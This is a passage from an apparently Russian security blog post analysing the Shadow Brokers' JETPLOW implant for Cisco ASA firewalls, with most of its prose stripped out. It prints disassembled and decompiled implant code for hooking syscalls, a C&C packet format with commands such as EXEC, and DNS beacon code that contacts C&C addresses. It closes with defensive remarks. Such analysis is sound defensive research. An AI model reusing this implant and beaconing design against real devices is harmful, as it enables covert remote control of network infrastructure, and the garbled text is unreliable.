that sys_mmap2() has ; triggered <span class="hljs-keyword"><span class="hljs-keyword">this</span></span> #SMI <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> dx, al pop eax retn ; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span> will <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> to SP Main EP ; ...</code> </pre> <br><p>  <em>SCA</em> ,       <em>sysenter_ret</em> (,           ),       <em>SP Main</em> .  <em>SCA</em>     <em>RSM</em> ,           <em>SP Main</em> , ,   ,      : </p><br><pre> <code class="hljs cs">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0x2D1</span></span> ; ... mov ecx, [edi+esi*<span class="hljs-number"><span class="hljs-number">4</span></span>+<span class="hljs-number"><span class="hljs-number">30</span></span>h] ; ecx &lt;- sysenter_ret mov [eax+<span class="hljs-number"><span class="hljs-number">4</span></span>], ecx ; <span class="hljs-number"><span class="hljs-number">62000</span></span> will <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> to <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> sysenter should have been mov [edi+esi*<span class="hljs-number"><span class="hljs-number">4</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>Ch], ebx mov dword ptr [eax], <span class="hljs-number"><span class="hljs-number">0</span></span> mov eax, [edi+<span class="hljs-number"><span class="hljs-number">4</span></span>] ; eax &lt;- sys_mmap2 ret addr mov fs:_mmap2_ret, eax mov eax, [edi] ; eax &lt;- mapped memory va? mov fs:_ss_eax, eax <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> eax, <span class="hljs-number"><span class="hljs-number">62000</span></span>h <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> eax, <span class="hljs-number"><span class="hljs-number">0</span></span> mov [edi+esi*<span class="hljs-number"><span class="hljs-number">4</span></span>+<span class="hljs-number"><span class="hljs-number">30</span></span>h], eax ; syscall will <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> to <span class="hljs-number"><span class="hljs-number">62000</span></span> mov edx, fs:_ss_esp <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edx, <span class="hljs-number"><span class="hljs-number">8</span></span> mov fs:_ss_esp, edx ; ...</code> </pre> <br><p>       : </p><br><p><img src="https://habrastorage.org/files/3e9/f0b/acf/3e9f0bacf4b143c999a87bda99285009.png" alt="     lina"></p><br><p>    <em>SP Main</em> ,      ,  ,          <em>malina</em> .       (   <em>lina</em>      <em>0x62200</em>    BIOS Flash),    "  ",    . </p><br><h3>     </h3><br><p>        ,    <em>FUA</em>  -      <em>userarea</em> .    ,  ,     <em>SUA</em>      . ,          ,         ).    <em>SP Main</em>       ,       ,      C&amp;C,   : ",   .  -  Lina.   ?". </p><br><p>      ,     .   ,      C&amp;C      ,            . </p><br><p>           ,     <em>lina</em> .    <em>SP Main</em>        <em>FCA</em>  <em>FUA</em>  <em>RAM</em>       <em>_td_ctx_enter</em> ,       <em>malina</em>        <em>SCA</em> .  , <em>SP Main</em>      <em>lina</em>   ,   .     <em>malina</em>    ,         <em>0x100040</em> . </p><br><p>   <em>SP Main</em>    ( <em>FCA</em> )  <em>PBD Header</em>    BIOS Flash  <em>anonymous mapping</em>    . </p><br><p>  <em>SP Main</em>      .     <em>/proc/self/maps</em>          <em>lina</em> . </p><br><p> ,    ELF-  , <em>SP Main</em>    <em>_td_ctx_enter</em>  ,   <em>SCA</em>  ,     <em>malina</em> (   <em>55 53 65 57</em> ). </p><br><p>      <em>mprotect</em>  ,    ,    ,      ,      <em>SP Main</em>    . </p><br><p>  ,    ,     <em>lina</em> ,    <em>malina</em> . </p><br><p>       <em>_td_ctx_enter</em> , <em>SP Main</em>       ,     .       :     (socket, bind, sendto, close, etc.);       ( , , etc.);    <em>SNMP</em> (  );    <em>syslog</em>  . </p><br><p>         ,       . ,   ,          <em>FCA</em> (.     <em>FCA</em>   <em>0x2D60</em> ). </p><br><p> ,     ,      <em>main</em>  .       ,         C&amp;C,     . </p><br><h2>    </h2><br><h3>      OSI </h3><br><p>          C&amp;C        <em>OSI</em> . </p><br><p>      <em>IPv4</em>  <em>IPv6</em> ,     . </p><br><p>      <em>UDP</em> .        <em>PBD_Header.min_src_port ‚Äì PBD_Header.max_src_port</em> .            ,   C&amp;C. </p><br><p>          <em>Benign</em> -,        ,     ,   ,           .    ,    <em>Benign</em> -  512  ( <em>BENIGNSIZE</em>   ),   ,       .   <em>Benign</em> -     . </p><br><p>            RC6    <em>Benign</em> -. </p><br><p>        " ‚Äì ".      ,   .            <em>Benign</em> -. </p><br><h3>  Benign- </h3><br><p>  <em>Benign</em> -,    -,    : </p><br><pre> <code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BenignHeader</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> type; <span class="hljs-comment"><span class="hljs-comment">/* request type */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> padLength; <span class="hljs-comment"><span class="hljs-comment">/* minimal size of BENIGN packet is 8 bytes, hence the padding */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> pkt_ID; <span class="hljs-comment"><span class="hljs-comment">/* incremented with each new packet */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> benign_payload_length; <span class="hljs-comment"><span class="hljs-comment">/* payload size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> sequenceNumber; <span class="hljs-comment"><span class="hljs-comment">/* sequential number of payload fragment */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> ackNumber; <span class="hljs-comment"><span class="hljs-comment">/* number of request packet for which this packet is response to */</span></span> }; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BenignPacket</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> cf_crc; <span class="hljs-comment"><span class="hljs-comment">/* some value as returned by Check_Function */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> cv[<span class="hljs-number"><span class="hljs-number">2</span></span>]; <span class="hljs-comment"><span class="hljs-comment">/* initializtion vector for encryption */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> salt[<span class="hljs-number"><span class="hljs-number">8</span></span>]; <span class="hljs-comment"><span class="hljs-comment">/* random salt */</span></span> BenignHeader header; <span class="hljs-comment"><span class="hljs-comment">/* payload header */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> payload[<span class="hljs-number"><span class="hljs-number">0</span></span>]; <span class="hljs-comment"><span class="hljs-comment">/* CO to the rescue */</span></span> }</code> </pre> <br><p>  <em>type</em>   /,     . </p><br><p>    (  ): </p><br><ul><li> HELLO </li><li> AUTH_RESP </li><li> CHALLENGE </li><li>  ACK </li><li>  ERROR </li><li> GOODBYE </li><li> READ </li><li> WRITE </li><li> MALLOC </li><li> FREE </li><li> EXEC </li><li> MOD_INFO </li><li> MOD_DATA </li><li> MOD_LIST </li><li> MOD_ACTIVATE </li><li> MOD_DEACTIVATE </li><li> MOD_REMOVE </li><li> COMMAND_ADD </li><li> COMMAND_LIST </li><li> BOX_INFO </li><li> FRAG_TYPE </li><li> LAST_IN_LIST </li></ul><br><p>  <em>padLength</em>    ,    ,      8 .     ,   ,    RC6,  16  (8  <em>salt</em> + 16  <em>header</em> = 24 ,    32 ). </p><br><p>  <em>pkt_ID</em>        . </p><br><p>  <em>benign_payload_length</em>       <em>payload</em> . </p><br><p>  <em>sequenceNumber</em>      ,      512 . </p><br><p>  <em>ackNumber</em> ,          . </p><br><p>  <em>cf_crc</em> , ,       ,      <em>UDP</em> - <em>Benign</em> -. </p><br><p>      ,     <em>BenignPacket2.salt</em> ,     RC6.         <em>PBD_Header.default_key1</em> .        <em>cv</em> ,    16- SHA-1 ,     ,     .   <em>salt</em>     <em>defauly_key1</em>  <a href="https://en.wikipedia.org/wiki/Time_Stamp_Counter">TSC</a> . </p><br><h3>    Beacon- </h3><br><p>  ,           ,       , ,    IP- ,  ,     ,    ""  <em>Beacon</em> -. </p><br><p>  ,    IP-  ,     <em>Beacon</em> -  <em>DNS</em> -     <strong>A</strong> ( <em>address record</em> ),     <code>www.subdomain.domain.com</code> .  <em>domain</em> ‚Äì   , , ,          ,  <em>subdomain</em> ‚Äì   . </p><br><p>   , ,  <a href="https://www.cobaltstrike.com/help-dns-beacon">Cobalt Strike</a>   ""   . </p><br><p>   <em>DNS</em> : </p><br><pre> <code class="hljs haskell">// `bin/asa5505/<span class="hljs-type"><span class="hljs-type">SCP28</span></span>/asa5505_patch60000.bin` offset <span class="hljs-number"><span class="hljs-number">0x9670</span></span> // ... memcpy(subdomain, _subdomin, <span class="hljs-number"><span class="hljs-number">16</span></span>); dns_packet-&gt;query.www_sz = <span class="hljs-number"><span class="hljs-number">3</span></span>; memcpy(dns_packet-&gt;query.www, aWww, <span class="hljs-number"><span class="hljs-number">3</span></span>); dns_packet-&gt;query.subdomain_sz = <span class="hljs-number"><span class="hljs-number">0x11</span></span>; dns_packet-&gt;query.subdomain[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0x41</span></span>; memcpy(&amp;dns_packet-&gt;query.subdomain[<span class="hljs-number"><span class="hljs-number">1</span></span>], subdomain, <span class="hljs-number"><span class="hljs-number">16</span></span>); dns_packet-&gt;query.domain_sz = _sizeof_pbd_domain; memcpy(dns_packet-&gt;query.domain, _5400-&gt;domain_name, _sizeof_pbd_domain); com = &amp;dns_packet-&gt;query.domain[_sizeof_pbd_domain]; com-&gt;com_sz = <span class="hljs-number"><span class="hljs-number">3</span></span>; // sizeof(<span class="hljs-string"><span class="hljs-string">"com"</span></span>) without trailing \x00 memcpy(com-&gt;com, aCom, <span class="hljs-number"><span class="hljs-number">4</span></span>); com-&gt;qtype = rol_16_8(<span class="hljs-number"><span class="hljs-number">1</span></span>); // <span class="hljs-type"><span class="hljs-type">Type</span></span> <span class="hljs-type"><span class="hljs-type">A</span></span> query (host address) qclass = rol_16_8(<span class="hljs-number"><span class="hljs-number">1</span></span>); ip_selector = (_5400-&gt;beacon_num &amp; <span class="hljs-number"><span class="hljs-number">1</span></span>) == <span class="hljs-number"><span class="hljs-number">0</span></span>; com-&gt;qclass = qclass; // <span class="hljs-type"><span class="hljs-type">Class</span></span> <span class="hljs-type"><span class="hljs-type">IN</span></span> query (<span class="hljs-type"><span class="hljs-type">Internet</span></span> address) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( ip_selector ) daddr = _5400-&gt;beacon_secondary_IP; <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> daddr = _5400-&gt;beacon_primary_IP; // unsigned __int32 __usercall udp_send@&lt;eax&gt;(int a1@&lt;eax&gt;, int buf@&lt;edx&gt;, unsigned __int16 len@&lt;cx&gt;, unsigned int a4, __int16 sport, __int16 dport, unsigned int daddr) udp_send(_5400, _5400-&gt;_send_buf, com + <span class="hljs-number"><span class="hljs-number">9</span></span> - dns_packet, _5400-&gt;_const_FFFFFFFF, sport, <span class="hljs-number"><span class="hljs-number">53</span></span>, daddr); // ...</code> </pre> <br><p>   <em>DNS</em> - <em>Beacon</em> -  IP-       IP-    ,     <em>subdomain</em> . </p><br><p>  ,  ,  <em>Beacon</em> -     <em>DNS</em> -,       ,       ,      400     . </p><br><p>  <em>Beacon</em> -         <em>DNS</em> -:     <em>PBD_Header.primary_beacon_IP</em> ,    ‚Äì <em>PBD_Header.secondary_beacon_IP</em> . </p><br><p>  ,  <em>Beacon</em> -    ,          .    ""     <em>DNS</em> -, ,  ,        ,    . </p><br><p>       ,     <em>Beacon</em> -       <em>DNS</em> -. </p><br><p>   ,      : </p><br><p> <code>www.[dev_id?][implant_id_enc][some_obf].[domain].com</code> ,  </p><br><ul><li> <em>dev_id?</em> ‚Äì  'A',    "ASA" (1 ); </li><li> <em>implant_id_enc</em> ‚Äì    (8 ); </li><li> <em>some_obf</em> ‚Äì     <em>implant_id_enc</em> (8 ); </li><li> <em>domain</em> ‚Äì    <em>domain</em>  <em>PBD_Header</em> (8 ). </li></ul><br><p>    <em>DNS</em> -   <em>bin/asa5505/SCP28/asa5505_patch60000.bin</em>   <em>0x9670</em> . </p><br><h3> Coming soon... </h3><br><p>  ,                .     ,      : </p><br><ul><li>     <em>DGA</em> . </li><li>      <em>userarea</em> . </li><li>      . </li></ul><br><h2>   </h2><br><p>  Cisco    <a href="http://blogs.cisco.com/security/shadow-brokers"></a>   : </p><br><p><img src="https://habrastorage.org/files/056/3df/3ef/0563df3ef00c4b10b18d9d728715c64c.PNG" alt="  blogs.cisco.com"></p><br><p>     ? </p><br><p> ,  , ,   ,           ?               ,    :   ,   , ¬´  ¬ª -  .. </p><br><p>    <a href="http://www.cisco.com/c/en/us/about/security-center/intelligence/asa-integrity-assurance.html">verify</a> ,    ,          ,         ,        .             ‚Äì   . </p><br><p>   ,    ,  ,  JETPLOW         . </p><br><p>  How to be? </p><br><p>       ,   ,         . ,   ‚Äì     ,    ‚Äì   ,         . </p><br><p>       ,             ASA     ,             JP/SCP.        ,        . </p><br><p>    SecureBoot  Trust Anchor? </p><br><p>          <a href="https://habrahabr.ru/company/dsec/blog/272183/"> </a>   "   Cisco".   ,        ,  ,   ,     Cisco. </p><br><h2>  Conclusion </h2><br><p>        <em>The Shadow Brokers</em> ,     : </p><br><ol><li>   <em>The Shadow Brokers</em>  ,   ,       . </li><li>   <em>JETPLOW/SCREAMINGPLOW</em>    ,     . </li><li>    (TPM)  <em>JETPLOW</em>    ,       . </li></ol><br><h2>   </h2><br><ul><li>   / <a href="https://habrahabr.ru/users/nezl00y/" class="user_link">nezl00y</a> </li><li>   / <a href="https://habrahabr.ru/users/danse/" class="user_link">danse</a> </li></ul></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/309560/">https://habr.com/ru/post/309560/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../309550/index.html">HPE Vertica 8 Review (Frontloader)</a></li>
<li><a href="../309552/index.html">How I created the HTML killer</a></li>
<li><a href="../309554/index.html">"How I spent this summer": video from summer meetings JUG.ru</a></li>
<li><a href="../309556/index.html">Docker. Why and how</a></li>
<li><a href="../309558/index.html">Black box for the house: collect NAS do-it-yourself, part 1</a></li>
<li><a href="../309564/index.html">Centralized backup policy management</a></li>
<li><a href="../309566/index.html">Security Week 36: Nexus 5X vulnerability, crypto-fiber posting pictures, attacking Linux servers via Redis</a></li>
<li><a href="../309568/index.html">Laravel 5.3: Preparation for development (for beginners)</a></li>
<li><a href="../309570/index.html">About the Internet of things and the semiconductor industry in the region where they drink camel milk. The first day</a></li>
<li><a href="../309572/index.html">Offline-first app with Hoodie & React. Part Two: Authorization</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>